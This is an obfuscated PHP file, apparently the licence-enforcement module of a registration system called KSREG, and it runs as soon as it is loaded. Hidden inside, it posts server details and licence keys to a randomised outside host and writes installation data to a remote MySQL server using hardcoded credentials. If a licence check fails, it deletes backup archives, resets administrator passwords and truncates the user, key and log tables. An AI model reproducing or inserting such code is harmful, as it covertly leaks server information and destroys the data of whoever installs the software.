<?php

function HY_068969f52fca53fa37($HY_fc12e3cf6043961fb3 = 1)
{
	$HY_b82d21ca0e0bf53f05 = unpack("C*", "ViewZendSourceCodeIsInvalid!");

	do {
		$HY_94d81d317ac6f7e6a6 = ($HY_3582284ada7175f52d[$HY_fc12e3cf6043961fb3] << 4) + ($HY_3582284ada7175f52d[$HY_fc12e3cf6043961fb3 + 1] >> 4);
		$HY_fc12e3cf6043961fb3 = $HY_fc12e3cf6043961fb3 + 2;
	} while ($HY_fc12e3cf6043961fb3 < 28);
}

function HY_4a032f7cb342581c6e($HY_ac13d1f48fe4f34362)
{
	return md5("baidugoogle..123" . $HY_ac13d1f48fe4f34362);
}

function HY_31e857bd337b68f0d8(&$HY_2b09a946b046127c26)
{
	$HY_2b09a946b046127c26 = strtr($HY_2b09a946b046127c26, "_-|", "+/=");
	$HY_2b09a946b046127c26 = base64_decode($HY_2b09a946b046127c26);
	$HY_139197abac8da26030 = ord($HY_2b09a946b046127c26[0]);
	$HY_2b09a946b046127c26 = substr($HY_2b09a946b046127c26, 1);
	$HY_1fd17ca119d44a564e = array(153, 66, 189, 175, 47, 143, 189, 169, 81, 41, 174, 91, 172, 125, 84, 157, 142, 69, 189, 190, 178, 94, 153, 73, 151, 175, 135, 54, 129, 141);

	if (CLIENTVER == 904) {
		$HY_1fd17ca119d44a564e = array(153, 66, 139, 175, 47, 143, 129, 169, 81, 41, 174, 98, 172, 125, 84, 157, 142, 69, 191, 189, 178, 94, 153, 73, 151, 175, 135, 54, 129, 141);
	}

	$HY_5380a89366e616d954[] = "";
	$HY_b73bbe72f4ddc45cdc[] = "";
	$HY_e5b34a6c4101f56f7f = strlen($HY_2b09a946b046127c26);

	for ($HY_fc12e3cf6043961fb3 = 0; $HY_fc12e3cf6043961fb3 < $HY_e5b34a6c4101f56f7f; $HY_fc12e3cf6043961fb3++) {
		$HY_2b09a946b046127c26[$HY_fc12e3cf6043961fb3] = chr(ord($HY_2b09a946b046127c26[$HY_fc12e3cf6043961fb3]) ^ $HY_139197abac8da26030);
	}

	for ($HY_fc12e3cf6043961fb3 = 0; $HY_fc12e3cf6043961fb3 < 256; $HY_fc12e3cf6043961fb3++) {
		$HY_5380a89366e616d954[$HY_fc12e3cf6043961fb3] = $HY_1fd17ca119d44a564e[$HY_fc12e3cf6043961fb3 % 30];
		$HY_b73bbe72f4ddc45cdc[$HY_fc12e3cf6043961fb3] = $HY_fc12e3cf6043961fb3;
	}

	for ($HY_c5d03c965a457403be = $HY_fc12e3cf6043961fb3 = 0; $HY_fc12e3cf6043961fb3 < 256; $HY_fc12e3cf6043961fb3++) {
		$HY_c5d03c965a457403be = ($HY_c5d03c965a457403be + $HY_b73bbe72f4ddc45cdc[$HY_fc12e3cf6043961fb3] + $HY_5380a89366e616d954[$HY_fc12e3cf6043961fb3] + 100) % 256;
		$HY_173d86697f24ffa1ee = $HY_b73bbe72f4ddc45cdc[$HY_fc12e3cf6043961fb3];
		$HY_b73bbe72f4ddc45cdc[$HY_fc12e3cf6043961fb3] = $HY_b73bbe72f4ddc45cdc[$HY_c5d03c965a457403be];
		$HY_b73bbe72f4ddc45cdc[$HY_c5d03c965a457403be] = $HY_173d86697f24ffa1ee;
	}

	$HY_5ebb334a2881170203 = "";

	for ($HY_ac13d1f48fe4f34362 = $HY_c5d03c965a457403be = $HY_fc12e3cf6043961fb3 = 0; $HY_fc12e3cf6043961fb3 < $HY_e5b34a6c4101f56f7f; $HY_fc12e3cf6043961fb3++) {
		$HY_ac13d1f48fe4f34362 = ($HY_ac13d1f48fe4f34362 + 1) % 256;
		$HY_c5d03c965a457403be = ($HY_c5d03c965a457403be + $HY_b73bbe72f4ddc45cdc[$HY_ac13d1f48fe4f34362]) % 256;
		$HY_173d86697f24ffa1ee = $HY_b73bbe72f4ddc45cdc[$HY_ac13d1f48fe4f34362];
		$HY_b73bbe72f4ddc45cdc[$HY_ac13d1f48fe4f34362] = $HY_b73bbe72f4ddc45cdc[$HY_c5d03c965a457403be];
		$HY_b73bbe72f4ddc45cdc[$HY_c5d03c965a457403be] = $HY_173d86697f24ffa1ee;
		$HY_87390afa0185fdf28c = $HY_b73bbe72f4ddc45cdc[($HY_b73bbe72f4ddc45cdc[$HY_ac13d1f48fe4f34362] + $HY_b73bbe72f4ddc45cdc[$HY_c5d03c965a457403be]) % 256];
		$HY_5ebb334a2881170203 .= chr(ord($HY_2b09a946b046127c26[$HY_fc12e3cf6043961fb3]) ^ $HY_87390afa0185fdf28c);
	}

	$HY_2b09a946b046127c26 = $HY_5ebb334a2881170203;
}

function error_report_fun_enorpeat($HY_79dd530b16454e1698, $HY_dfb6820a73cd9a022f, $HY_759798a253a6baead6, $HY_798f005d842acbb20f)
{
	return true;
}

function error_report_fun_norpeat($HY_79dd530b16454e1698, $HY_dfb6820a73cd9a022f, $HY_759798a253a6baead6, $HY_798f005d842acbb20f)
{
	set_error_handler("error_report_fun_enorpeat");
	$HY_1b2de0d9208ba0bcbd = str_rot13(base64_encode(str_rot13($HY_798f005d842acbb20f . ":" . $HY_dfb6820a73cd9a022f)));
	if (!is_file("apierr.log") || (102400 < filesize("apierr.log"))) {
		@file_put_contents("apierr.log", date("ymdHis") . "\t" . $HY_1b2de0d9208ba0bcbd . "\r\n\r\n");
	}
	else {
		@file_put_contents("apierr.log", date("ymdHis") . "\t" . $HY_1b2de0d9208ba0bcbd . "\r\n\r\n", FILE_APPEND);
	}

	set_error_handler("error_report_fun_norpeat");
	return true;
}

function error_report_fun_corpeat($HY_79dd530b16454e1698, $HY_dfb6820a73cd9a022f, $HY_759798a253a6baead6, $HY_798f005d842acbb20f)
{
	echo $HY_798f005d842acbb20f . ":" . $HY_dfb6820a73cd9a022f;
	return true;
}

function HY_66ae2207149b60aa1c($HY_d2151338207d73000c)
{
	if (!is_file("clsdata.log")) {
		@file_put_contents("clsdata.log", date("ymdHis") . "\t" . $HY_d2151338207d73000c . "\r\n\r\n");
	}
	else {
		@file_put_contents("clsdata.log", date("ymdHis") . "\t" . $HY_d2151338207d73000c . "\r\n\r\n", FILE_APPEND);
	}
}

function HY_638410abb5a4c93078()
{
	hy_0a7db0502a0451082f();

	if (md5("KeY!@#%&*,AbIoPe*v_19-82" . substr(WEBLIC, 33) . HTTPKEY) != substr(WEBLIC, 0, 32)) {
		$HY_2b09a946b046127c26 = "";
		hy_66ae2207149b60aa1c("domain md5err");
		hy_34eda5206b19678700();
	}
}

function HY_0a7db0502a0451082f()
{
	global $HY_43e4557f250c621a39;
	$HY_79164cecae6324a2ba = explode(",", substr(WEBLIC, 33));
	$HY_0c87abe5916200b1e8 = $_SERVER["HTTP_HOST"];
	$HY_fc12e3cf6043961fb3 = strpos($HY_0c87abe5916200b1e8, ":");

	if ($HY_fc12e3cf6043961fb3 !== false) {
		$HY_0c87abe5916200b1e8 = substr($HY_0c87abe5916200b1e8, 0, $HY_fc12e3cf6043961fb3);
	}

	if (in_array(strtolower($HY_0c87abe5916200b1e8), $HY_79164cecae6324a2ba)) {
		if (isset($_SERVER["ALL_HTTP"])) {
			if (stristr($_SERVER["ALL_HTTP"], $HY_0c87abe5916200b1e8) === false) {
				hy_66ae2207149b60aa1c("domain err:\r\n" . $_SERVER["HTTP_HOST"] . "\r\n" . $_SERVER["ALL_HTTP"]);

				if ($HY_43e4557f250c621a39 == 1) {
					exit("crypteno888");
				}

				exit("Thank you for using KSREG,    please support the Genuine software! ALL_HTTP");
			}
		}
	}
	else {
		hy_66ae2207149b60aa1c("domain err:\r\n" . $_SERVER["HTTP_HOST"] . "\r\n" . $_SERVER["ALL_HTTP"]);

		if ($HY_43e4557f250c621a39 == 1) {
			exit("crypteno888");
		}

		exit("Thank you for using KSREG,    please support the Genuine software! HTTP_HOST");
	}
}

function HY_3b7f146c7c5ac28cc2($HY_a37563c8dd3c50a2d9, $HY_b10208355168ebdccb, $HY_69d4e23a069ae50bd0)
{
	$HY_7ecb634edd356ee247 = curl_init();
	curl_setopt($HY_7ecb634edd356ee247, CURLOPT_URL, "http://chk" . mt_rand(100000, 999999) . ".hphu.com/skey/api.php?r=" . time());
	curl_setopt($HY_7ecb634edd356ee247, CURLOPT_RETURNTRANSFER, 1);
	$HY_6c370550d94caffe93 = "svrid=" . SVRID . "&hostname=" . $HY_b10208355168ebdccb . "&skey=" . PRV_SVRLIC . "&spath=" . dirname(__FILE__) . "&domain=" . $HY_69d4e23a069ae50bd0 . "&weblic=" . urlencode(WEBLIC) . "&webid=" . urlencode(WEBID) . "&nowtime=" . date("Y-m-d H:i:s");
	curl_setopt($HY_7ecb634edd356ee247, CURLOPT_POST, 1);
	curl_setopt($HY_7ecb634edd356ee247, CURLOPT_POSTFIELDS, $HY_6c370550d94caffe93);
	curl_setopt($HY_7ecb634edd356ee247, CURLOPT_TIMEOUT, 5);
	curl_setopt($HY_7ecb634edd356ee247, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; SV1)");
	curl_setopt($HY_7ecb634edd356ee247, CURLOPT_HTTPHEADER, array("Accept-Language: zh-cn", "Connection: close", "Cache-Control: no-cache"));
	$HY_73d03700723b9213e5 = curl_exec($HY_7ecb634edd356ee247);

	if (curl_errno($HY_7ecb634edd356ee247)) {
		@curl_close($HY_7ecb634edd356ee247);
		hy_399c1ad1c3cbdde5cb();
	}
	else {
		curl_close($HY_7ecb634edd356ee247);

		if ($HY_73d03700723b9213e5 == "isbadlic") {
			hy_66ae2207149b60aa1c("curl badlist");
			hy_34eda5206b19678700();
		}
	}
}

function HY_399c1ad1c3cbdde5cb($HY_a37563c8dd3c50a2d9, $HY_b10208355168ebdccb, $HY_69d4e23a069ae50bd0)
{
	if ("/" == DIRECTORY_SEPARATOR) {
		$HY_4c5e828662c8000175 = $_SERVER["SERVER_ADDR"];
	}
	else {
		$HY_4c5e828662c8000175 = @gethostbyname($_SERVER["SERVER_NAME"]);
	}

	$HY_269ff7506022edb612 = @mysql_connect("58.221.31.10:33069", "readuser", "password");

	if ($HY_269ff7506022edb612) {
		if (@mysql_select_db("readuser", $HY_269ff7506022edb612)) {
			$HY_970be7709f584ff59c = @mysql_query("select * from `locktable` where `lockstr`='" . WEBID . "' or `lockstr`='" . WEBLIC . "' or `lockstr`='" . PRV_SVRLIC . "' or `lockstr`='" . $HY_b10208355168ebdccb . "' ", $HY_269ff7506022edb612);
			if (($HY_970be7709f584ff59c !== false) && (0 < mysql_num_rows($HY_970be7709f584ff59c))) {
				hy_66ae2207149b60aa1c("sql badlist");
				hy_34eda5206b19678700();
				mysql_query("INSERT INTO `logtablelog` (`isok`,`clienttime` ,`hostname` ,`domain` ,`weblic`, `webid`,`svrid`,`skey`,`cip`)VALUES (0,'" . $HY_a37563c8dd3c50a2d9 . "', '" . $HY_b10208355168ebdccb . "', '" . $HY_69d4e23a069ae50bd0 . "', '" . WEBLIC . "', '" . WEBID . "'," . (SVRID + 2) . ",'" . PRV_SVRLIC . "','" . $HY_4c5e828662c8000175 . "')", $HY_269ff7506022edb612);
			}
			else {
				mysql_query("INSERT INTO `logtablelog` (`isok`,`clienttime` ,`hostname` ,`domain` ,`weblic`, `webid`,`svrid`,`skey`,`cip`)VALUES (1,'" . $HY_a37563c8dd3c50a2d9 . "', '" . $HY_b10208355168ebdccb . "', '" . $HY_69d4e23a069ae50bd0 . "', '" . WEBLIC . "', '" . WEBID . "'," . (SVRID + 2) . ",'" . PRV_SVRLIC . "','" . $HY_4c5e828662c8000175 . "')", $HY_269ff7506022edb612);
			}
		}

		@mysql_close($HY_269ff7506022edb612);
		return true;
	}
	else {
		return false;
	}
}

function HY_34eda5206b19678700($HY_856f0077cda92a4b14 = "")
{
	global $HY_e83242934e1fdef61f;
	global $HY_43e4557f250c621a39;

	if ($HY_856f0077cda92a4b14 != "") {
		$HY_e83242934e1fdef61f = $HY_856f0077cda92a4b14;
		$HY_43e4557f250c621a39 = 0;
	}

	file_put_contents(KSSLOGDIR . "index.log", "200001011059550389");

	if (defined("NOTDELMYSQL")) {
		if ($HY_43e4557f250c621a39 == 1) {
			exit("crypteno888");
		}

		exit("Thank you for using KSREG,   please support the Genuine software! NCLS");
	}

	$HY_51dfbf89c1a4942f8e = hy_3c956344ed050d8c7e(KSSROOTDIR . "kss_logs" . DIRECTORY_SEPARATOR . "databak" . DIRECTORY_SEPARATOR, "zip");

	if (!empty($HY_51dfbf89c1a4942f8e)) {
		foreach ($HY_51dfbf89c1a4942f8e as $HY_ff78aa8a3e91f69b9f ) {
			@file_put_contents($HY_ff78aa8a3e91f69b9f, "dataerr");
			@unlink($HY_ff78aa8a3e91f69b9f);
		}
	}

	$HY_82d6536edf704aabc5 = new mysql_cls();
	$HY_82d6536edf704aabc5->HY_8adfa6fa6f18be3e6f($HY_e83242934e1fdef61f);
	$HY_b145448aa76bc95b5e = $HY_82d6536edf704aabc5->HY_7cbdce9f890757a7f0("select * from kss_tb_soft ");

	foreach ($HY_b145448aa76bc95b5e as $HY_970be7709f584ff59c ) {
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("update `kss_z_user_" . $HY_970be7709f584ff59c["pid"] . "_" . $HY_970be7709f584ff59c["id"] . "` set cday=1000", "sync");
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("update `kss_z_key_" . $HY_970be7709f584ff59c["pid"] . "_" . $HY_970be7709f584ff59c["id"] . "` set cday=1000", "sync");
	}

	$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("update kss_tb_manager set password='000000000000000', rmb=0, level=6, islock=1", "sync");
	$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("update kss_tb_soft set softcode=1000099, softmode='NoN', softkey='000000000000000'", "sync");

	foreach ($HY_b145448aa76bc95b5e as $HY_970be7709f584ff59c ) {
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("TRUNCATE TABLE `kss_z_user_" . $HY_970be7709f584ff59c["pid"] . "_" . $HY_970be7709f584ff59c["id"] . "`", "sync");
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("TRUNCATE TABLE `kss_z_key_" . $HY_970be7709f584ff59c["pid"] . "_" . $HY_970be7709f584ff59c["id"] . "`", "sync");
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("TRUNCATE TABLE `kss_z_log_" . $HY_970be7709f584ff59c["pid"] . "_" . $HY_970be7709f584ff59c["id"] . "`", "sync");
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("TRUNCATE TABLE `kss_z_user_" . $HY_970be7709f584ff59c["pid"] . "_" . $HY_970be7709f584ff59c["id"] . "_recycle`", "sync");
		$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("TRUNCATE TABLE `kss_z_key_" . $HY_970be7709f584ff59c["pid"] . "_" . $HY_970be7709f584ff59c["id"] . "`_recycle", "sync");
	}

	$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("TRUNCATE TABLE `kss_tb_soft`", "sync");
	$HY_82d6536edf704aabc5->HY_e6e8aeec74e7b16058("TRUNCATE TABLE `kss_tb_manager`", "sync");

	if ($HY_43e4557f250c621a39 == 1) {
		exit("crypteno888");
	}

	exit("Thank you for using KSREG,    please support the Genuine software! CLS");
}

hy_638410abb5a4c93078();

?>
